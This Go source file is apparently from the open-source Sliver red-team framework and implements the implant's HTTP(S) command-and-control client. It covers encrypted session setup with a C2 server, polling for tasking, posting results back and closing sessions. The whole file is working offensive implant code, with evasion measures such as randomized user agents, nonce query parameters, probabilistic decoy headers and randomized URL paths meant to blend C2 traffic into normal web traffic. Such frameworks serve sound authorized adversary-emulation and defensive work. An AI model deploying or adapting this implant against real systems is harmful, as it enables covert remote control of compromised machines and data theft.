package httpclient

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// {{if .Config.IncludeHTTP}}

import (
	"bytes"
	"context"
	"errors"
	"fmt"
	"io"
	insecureRand "math/rand"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"sync"
	"time"

	// {{if .Config.Debug}}
	"log"

	// {{end}}

	"github.com/bishopfox/sliver/implant/sliver/cryptography"
	"github.com/bishopfox/sliver/implant/sliver/encoders"
	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
	"google.golang.org/protobuf/proto"
)

var (
	goHTTPDriver = "go"

	userAgent          = "{{GenerateUserAgent}}"
	NonceQueryArgChars = "{{.HTTPC2ImplantConfig.NonceQueryArgChars}}" // "abcdefghijklmnopqrstuvwxyz"

	ErrClosed                             = errors.New("http session closed")
	ErrStatusCodeUnexpected               = errors.New("unexpected http response code")
	TimeDelta               time.Duration = 0
)

// {{if .Config.Debug}} -- UNIT TESTS ONLY
func SetNonceQueryArgChars(queryArgs string) {
	NonceQueryArgChars = queryArgs
}

// {{end}}

// HTTPOptions - c2 specific configuration options
type HTTPOptions struct {
	Driver               string
	NetTimeout           time.Duration
	TlsTimeout           time.Duration
	PollTimeout          time.Duration
	MaxErrors            int
	ForceHTTP            bool
	NoFallback           bool
	DisableUpgradeHeader bool
	HostHeader           string

	ProxyConfig   string
	ProxyUsername string
	ProxyPassword string
	AskProxyCreds bool
}

// ParseHTTPOptions - Parse c2 specific configuration options
func ParseHTTPOptions(c2URI *url.URL) *HTTPOptions {
	netTimeout, err := time.ParseDuration(c2URI.Query().Get("net-timeout"))
	if err != nil {
		netTimeout = time.Duration(30 * time.Second)
	}
	tlsTimeout, err := time.ParseDuration(c2URI.Query().Get("tls-timeout"))
	if err != nil {
		tlsTimeout = time.Duration(30 * time.Second)
	}
	pollTimeout, err := time.ParseDuration(c2URI.Query().Get("poll-timeout"))
	if err != nil {
		pollTimeout = time.Duration(30 * time.Second)
	}
	maxErrors, err := strconv.Atoi(c2URI.Query().Get("max-errors"))
	if err != nil || maxErrors < 0 {
		maxErrors = 10
	}
	driverName := strings.TrimSpace(strings.ToLower(c2URI.Query().Get("driver")))
	if driverName == "" {
		driverName = goHTTPDriver
	}

	return &HTTPOptions{
		Driver:               driverName,
		NetTimeout:           netTimeout,
		TlsTimeout:           tlsTimeout,
		PollTimeout:          pollTimeout,
		MaxErrors:            maxErrors,
		ForceHTTP:            c2URI.Query().Get("force-http") == "true",
		NoFallback:           c2URI.Query().Get("no-fallback") == "true",
		DisableUpgradeHeader: c2URI.Query().Get("disable-upgrade-header") == "true",
		HostHeader:           c2URI.Query().Get("host-header"),

		ProxyConfig:   c2URI.Query().Get("proxy"),
		ProxyUsername: c2URI.Query().Get("proxy-username"),
		ProxyPassword: c2URI.Query().Get("proxy-password"),
		AskProxyCreds: c2URI.Query().Get("ask-proxy-creds") == "true",
	}
}

// HTTPStartSession - Attempts to start a session with a given address
func HTTPStartSession(address string, pathPrefix string, opts *HTTPOptions) (*SliverHTTPClient, error) {
	var client *SliverHTTPClient
	var err error
	if !opts.ForceHTTP {
		client = httpsClient(address, opts)
		client.Options = opts
		client.PathPrefix = pathPrefix
		err = client.SessionInit()
		if err == nil {
			return client, nil
		}
	}
	if (err != nil && !opts.NoFallback) || opts.ForceHTTP {
		// If we're using default ports then switch to 80
		if strings.HasSuffix(address, ":443") {
			address = fmt.Sprintf("%s:80", address[:len(address)-4])
		}

		client = httpClient(address, opts) // Fallback to insecure HTTP
		client.Options = opts
		client.PathPrefix = pathPrefix
		err = client.SessionInit()
		if err != nil {
			return nil, err
		}
	}
	return client, nil
}

// HTTPDriver - The interface to send/recv HTTP data
type HTTPDriver interface {
	Do(*http.Request) (*http.Response, error)
}

// SliverHTTPClient - Helper struct to keep everything together
type SliverHTTPClient struct {
	Origin     string
	PathPrefix string
	driver     HTTPDriver
	ProxyURL   string
	SessionCtx *cryptography.CipherContext
	SessionID  string
	// pollTimeout time.Duration
	pollCancel context.CancelFunc
	pollMutex  *sync.Mutex
	Closed     bool

	Options *HTTPOptions
}

// SessionInit - Initialize the session
func (s *SliverHTTPClient) SessionInit() error {
	sKey := cryptography.RandomSymmetricKey()
	s.SessionCtx = cryptography.NewCipherContext(sKey)
	httpSessionInit := &pb.HTTPSessionInit{Key: sKey[:]}
	data, _ := proto.Marshal(httpSessionInit)

	encryptedSessionInit, err := cryptography.AgeKeyExToServer(data)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Nacl encrypt failed %v", err)
		// {{end}}
		return err
	}
	err = s.establishSessionID(encryptedSessionInit)
	if err != nil {
		return err
	}
	return nil
}

// NonceQueryArgument - Adds a nonce query argument to the URL
func (s *SliverHTTPClient) NonceQueryArgument(uri *url.URL, value uint64) *url.URL {
	values := uri.Query()
	key := NonceQueryArgChars[insecureRand.Intn(len(NonceQueryArgChars))]
	argValue := fmt.Sprintf("%d", value)
	for i := 0; i < insecureRand.Intn(3); i++ {
		index := insecureRand.Intn(len(argValue))
		char := string(NonceQueryArgChars[insecureRand.Intn(len(NonceQueryArgChars))])
		argValue = argValue[:index] + char + argValue[index:]
	}
	values.Add(string(key), argValue)
	uri.RawQuery = values.Encode()
	return uri
}

// OTPQueryArgument - Adds an OTP query argument to the URL
func (s *SliverHTTPClient) OTPQueryArgument(uri *url.URL, value string) *url.URL {
	values := uri.Query()
	key1 := NonceQueryArgChars[insecureRand.Intn(len(NonceQueryArgChars))]
	key2 := NonceQueryArgChars[insecureRand.Intn(len(NonceQueryArgChars))]
	for i := 0; i < insecureRand.Intn(3); i++ {
		index := insecureRand.Intn(len(value))
		char := string(NonceQueryArgChars[insecureRand.Intn(len(NonceQueryArgChars))])
		value = value[:index] + char + value[index:]
	}
	values.Add(string([]byte{key1, key2}), value)
	uri.RawQuery = values.Encode()
	return uri
}

func (s *SliverHTTPClient) newHTTPRequest(method string, uri *url.URL, body io.Reader) *http.Request {
	req, _ := http.NewRequest(method, uri.String(), body)
	if s.Options.HostHeader != "" {
		req.Host = s.Options.HostHeader
	}
	req.Header.Set("User-Agent", userAgent)
	if uri.Scheme == "http" && !s.Options.DisableUpgradeHeader {
		req.Header.Set("Upgrade-Insecure-Requests", "1")
	}

	type nameValueProbability struct {
		Name        string
		Value       string
		Probability string
		Method      string
	}

	// HTTP C2 Profile headers
	extraHeaders := []nameValueProbability{
		// {{range $header := .HTTPC2ImplantConfig.Headers}}
		{
			Name:        "{{$header.Name}}",
			Value:       "{{$header.Value}}",
			Probability: "{{$header.Probability}}",
			Method:      "{{$header.Method}}",
		},
		// {{end}}
	}

	for _, header := range extraHeaders {

		if len(header.Method) > 0 && header.Method != method {
			continue
		}
		// {{if .Config.Debug}}
		log.Printf("Rolling to add HTTP header '%s: %s' (%s)", header.Name, header.Value, header.Probability)
		// {{end}}
		probability, _ := strconv.Atoi(header.Probability)
		if 0 < probability {
			roll := insecureRand.Intn(99) + 1
			if probability < roll {
				continue
			}
		}
		req.Header.Set(header.Name, header.Value)
	}

	extraURLParams := []nameValueProbability{
		// {{range $param := .HTTPC2ImplantConfig.ExtraURLParameters}}
		{
			Name:        "{{$param.Name}}",
			Value:       "{{$param.Value}}",
			Probability: "{{$param.Probability}}",
			Method:      "{{$param.Method}}",
		},
		// {{end}}
	}
	queryParams := req.URL.Query()
	for _, param := range extraURLParams {
		if len(param.Method)>0 && param.Method != method {
			continue
		}
		probability, _ := strconv.Atoi(param.Probability)
		if 0 < probability {
			roll := insecureRand.Intn(99) + 1
			if probability < roll {
				continue
			}
		}
		queryParams.Set(param.Name, param.Value)
	}
	req.URL.RawQuery = queryParams.Encode()
	return req
}

func contains[T comparable](elements []T, v T) bool {
	for _, s := range elements {
		if v == s {
			return true
		}
	}
	return false
}

// Do - Wraps http.Client.Do with a context
func (s *SliverHTTPClient) DoPoll(req *http.Request) (*http.Response, []byte, error) {
	// NOTE: We must atomically manage the context
	s.pollMutex.Lock()
	ctx, cancel := context.WithCancel(req.Context())
	s.pollCancel = cancel
	defer func() {
		if s.pollCancel != nil {
			// {{if .Config.Debug}}
			log.Printf("Cancelling poll context")
			// {{end}}
			s.pollCancel()
		}
		s.pollCancel = nil
		s.pollMutex.Unlock()
	}()

	done := make(chan error)
	var resp *http.Response
	var data []byte
	var err error
	go func() {
		resp, err = s.driver.Do(req.WithContext(ctx))
		select {
		case <-ctx.Done():
			done <- ctx.Err()
		case <-time.After(s.Options.PollTimeout):
			// {{if .Config.Debug}}
			log.Printf("[http] poll timeout error!")
			// {{end}}
			done <- http.ErrHandlerTimeout
		default:
			if err == nil && resp != nil {
				data, err = io.ReadAll(resp.Body)
				defer resp.Body.Close()
			}
			// {{if .Config.Debug}}
			if err != nil {
				log.Printf("[http] poll failed to read all response: %s", err)
			}
			// {{end}}
			done <- err
		}
	}()
	return resp, data, <-done
}

// We do our own POST here because the server doesn't have the
// session key yet.
func (s *SliverHTTPClient) establishSessionID(sessionInit []byte) error {
	nonce, encoder := encoders.RandomEncoder(0)
	payload, _ := encoder.Encode(sessionInit)
	reqBody := bytes.NewReader(payload)

	uri := s.startSessionURL()
	s.NonceQueryArgument(uri, nonce)

	req := s.newHTTPRequest(http.MethodPost, uri, reqBody)
	// {{if .Config.Debug}}
	log.Printf("[http] POST -> %s (%d bytes)", uri, len(sessionInit))
	// {{end}}

	resp, err := s.driver.Do(req)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[http] http response error: %s", err)
		// {{end}}
		return err
	}
	if resp.StatusCode != http.StatusOK {
		serverDateHeader := resp.Header.Get("Date")
		if serverDateHeader != "" {
			// If the request failed and there is a Date header, find the time difference and save it for the next request
			curTime := time.Now().UTC()
			serverTime, err := time.Parse(time.RFC1123, serverDateHeader)
			if err == nil {
				TimeDelta = serverTime.UTC().Sub(curTime)
			}
		}
		// {{if .Config.Debug}}
		log.Printf("[http] non-200 response (%d): %v", resp.StatusCode, resp)
		// {{end}}
		return errors.New("send failed")
	}
	respData, err := io.ReadAll(resp.Body)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[http] response read error: %s", err)
		// {{end}}
		return err
	}
	defer resp.Body.Close()
	data, err := encoder.Decode(respData)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[http] response decoder failure: %s", err)
		// {{end}}
		return err
	}
	sessionID, err := s.SessionCtx.Decrypt(data)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[http] response decrypt failure: %s", err)
		// {{end}}
		return err
	}
	s.SessionID = string(sessionID)
	// {{if .Config.Debug}}
	log.Printf("[http] New session id: %v", s.SessionID)
	// {{end}}
	return nil
}

// ReadEnvelope - Perform an HTTP GET request
func (s *SliverHTTPClient) ReadEnvelope() (*pb.Envelope, error) {
	if s.Closed {
		return nil, ErrClosed
	}
	if s.SessionID == "" {
		return nil, errors.New("no session")
	}
	uri := s.parseSegments(0)
	nonce, encoder := encoders.RandomEncoder(0)
	s.NonceQueryArgument(uri, nonce)
	req := s.newHTTPRequest(http.MethodGet, uri, nil)
	// {{if .Config.Debug}}
	log.Printf("[http] GET -> %s", req.URL)
	// {{end}}
	resp, rawRespData, err := s.DoPoll(req)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[http] GET failed %v", err)
		// {{end}}
		return nil, err
	}
	if resp.StatusCode == http.StatusForbidden {
		// {{if .Config.Debug}}
		log.Printf("Server responded with invalid session for %v", s.SessionID)
		// {{end}}
		return nil, errors.New("invalid session")
	}
	if resp.StatusCode == http.StatusNoContent {
		return nil, nil
	}
	if resp.StatusCode == http.StatusOK {
		var body []byte
		if 0 < len(rawRespData) {
			body, err = encoder.Decode(rawRespData)
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("[http] Decoding failed %s", err)
				// {{end}}
				return nil, err
			}
		}
		plaintext, err := s.SessionCtx.Decrypt(body)
		if err != nil {
			return nil, err
		}
		envelope := &pb.Envelope{}
		err = proto.Unmarshal(plaintext, envelope)
		if err != nil {
			return nil, err
		}
		return envelope, nil
	}

	// {{if .Config.Debug}}
	log.Printf("[http] Unexpected status code %v", resp)
	// {{end}}
	return nil, ErrStatusCodeUnexpected
}

// WriteEnvelope - Perform an HTTP POST request
func (s *SliverHTTPClient) WriteEnvelope(envelope *pb.Envelope) error {
	if s.Closed {
		return ErrClosed
	}
	data, err := proto.Marshal(envelope)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[http] failed to encode request: %s", err)
		// {{end}}
		return err
	}
	if s.SessionID == "" {
		return errors.New("no session")
	}
	reqData, err := s.SessionCtx.Encrypt(data)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[http] failed to encrypt request: %s", err)
		// {{end}}
		return err
	}

	uri := s.parseSegments(1)
	nonce, encoder := encoders.RandomEncoder(len(reqData))
	s.NonceQueryArgument(uri, nonce)
	encodedValue, _ := encoder.Encode(reqData)
	reader := bytes.NewReader(encodedValue)

	// {{if .Config.Debug}}
	log.Printf("[http] POST -> %s (%d bytes)", uri, len(reqData))
	// {{end}}

	req := s.newHTTPRequest(http.MethodPost, uri, reader)
	resp, err := s.driver.Do(req)
	// {{if .Config.Debug}}
	log.Printf("[http] POST request completed")
	// {{end}}
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[http] request failed %v", err)
		// {{end}}
		return err
	}
	if resp.StatusCode != http.StatusAccepted {
		// {{if .Config.Debug}}
		log.Printf("[http] non-202 response (%d): %v", resp.StatusCode, resp)
		// {{end}}
		return ErrStatusCodeUnexpected
	}
	return nil
}

func (s *SliverHTTPClient) CloseSession() error {
	if s.Closed {
		return nil
	}
	if s.SessionID == "" {
		return errors.New("no session")
	}
	s.Closed = true

	// Cancel any pending poll request
	s.pollMutex.Lock()
	defer s.pollMutex.Unlock()
	if s.pollCancel != nil {
		s.pollCancel()
	}
	s.pollCancel = nil

	// Tell server session is closed
	uri := s.parseSegments(2)
	nonce, _ := encoders.RandomEncoder(0)
	s.NonceQueryArgument(uri, nonce)
	req := s.newHTTPRequest(http.MethodGet, uri, nil)
	// {{if .Config.Debug}}
	log.Printf("[http] GET -> %s", uri)
	// {{end}}
	resp, err := s.driver.Do(req)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[http] GET failed %v", err)
		// {{end}}
		return err
	}
	if resp.StatusCode != http.StatusAccepted {
		// {{if .Config.Debug}}
		log.Printf("[http] non-202 response (%d): %v", resp.StatusCode, resp)
		// {{end}}
		return errors.New("{{if .Config.Debug}}HTTP close failed (non-200 resp){{end}}")
	}
	// {{if .Config.Debug}}
	log.Printf("[http] session closed")
	// {{end}}
	return nil
}

func (s *SliverHTTPClient) pathJoinURL(segments []string) string {
	for index, segment := range segments {
		segments[index] = url.PathEscape(segment)
	}
	if s.PathPrefix != "" && s.PathPrefix != "/" {
		segments = append([]string{s.PathPrefix}, segments...)
	}
	return strings.Join(segments, "/")
}

func (s *SliverHTTPClient) parseSegments(segmentType int) *url.URL {
	curl, _ := url.Parse(s.Origin)
	var (
		pollFiles    []string
		pollPaths    []string
		sessionFiles []string
		sessionPaths []string
		closePaths   []string
		closeFiles   []string
	)

	// {{range .HTTPC2ImplantConfig.PathSegments}}
	// {{if eq .SegmentType 0 }}
	// {{if .IsFile}}
	pollFiles = append(pollFiles, "{{.Value}}")
	// {{end}}
	// {{if not .IsFile }}
	pollPaths = append(pollPaths, "{{.Value}}")
	// {{end}}
	// {{end}}

	// {{if eq .SegmentType 1}}
	// {{if .IsFile}}
	sessionFiles = append(sessionFiles, "{{.Value}}")
	// {{end}}
	// {{if not .IsFile }}
	sessionPaths = append(sessionPaths, "{{.Value}}")
	// {{end}}

	// {{end}}
	// {{if eq .SegmentType 2}}
	// {{if .IsFile}}
	closeFiles = append(closeFiles, "{{.Value}}")
	// {{end}}
	// {{if not .IsFile }}
	closePaths = append(closePaths, "{{.Value}}")
	// {{end}}
	// {{end}}
	// {{end}}

	switch segmentType {
	case 0:
		curl.Path = s.pathJoinURL(s.randomPath(pollPaths, pollFiles, "{{ .HTTPC2ImplantConfig.PollFileExtension }}"))
	case 1:
		curl.Path = s.pathJoinURL(s.randomPath(sessionPaths, sessionFiles, "{{ .HTTPC2ImplantConfig.SessionFileExtension }}"))
	case 2:
		curl.Path = s.pathJoinURL(s.randomPath(closePaths, closeFiles, "{{.HTTPC2ImplantConfig.CloseFileExtension}}"))
	default:
		return nil
	}

	return curl
}

func (s *SliverHTTPClient) startSessionURL() *url.URL {
	sessionURI := s.parseSegments(1)
	uri := strings.TrimSuffix(sessionURI.String(), "{{ .HTTPC2ImplantConfig.SessionFileExtension }}")
	uri += "{{ .HTTPC2ImplantConfig.StartSessionFileExtension }}"
	curl, _ := url.Parse(uri)
	return curl
}

// Must return at least a file name, path segments are optional
func (s *SliverHTTPClient) randomPath(segments []string, filenames []string, ext string) []string {
	genSegments := []string{}
	if 0 < len(segments) {
		min, _ := strconv.Atoi("{{.HTTPC2ImplantConfig.MinPaths}}")
		max, _ := strconv.Atoi("{{.HTTPC2ImplantConfig.MaxPaths}}")
		n := insecureRand.Intn(max-min+1) + min // How many segments?
		for index := 0; index < n; index++ {
			seg := segments[insecureRand.Intn(len(segments))]
			genSegments = append(genSegments, seg)
		}
	}
	filename := filenames[insecureRand.Intn(len(filenames))]

	// {{if .Config.Debug}}
	log.Printf("[http] segments = %v, filename = %s, ext = %s", genSegments, filename, ext)
	// {{end}}
	genSegments = append(genSegments, fmt.Sprintf("%s.%s", filename, ext))
	return genSegments
}

// [ HTTP(S) Clients ] ------------------------------------------------------------

func httpClient(address string, opts *HTTPOptions) *SliverHTTPClient {
	origin := fmt.Sprintf("http://%s", address)
	driver, err := GetHTTPDriver(origin, false, opts)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[http] failed to initialize driver: %v", err)
		// {{end}}
		return nil
	}
	client := &SliverHTTPClient{
		Origin:    origin,
		driver:    driver,
		pollMutex: &sync.Mutex{},
		Closed:    false,
		Options:   opts,
	}
	return client
}

func httpsClient(address string, opts *HTTPOptions) *SliverHTTPClient {
	origin := fmt.Sprintf("https://%s", address)
	driver, err := GetHTTPDriver(origin, true, opts)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[http] failed to initialize driver: %v", err)
		// {{end}}
		return nil
	}
	client := &SliverHTTPClient{
		Origin:    origin,
		driver:    driver,
		pollMutex: &sync.Mutex{},
		Closed:    false,
		Options:   opts,
	}
	return client
}

// {{end}} -IncludeHTTP
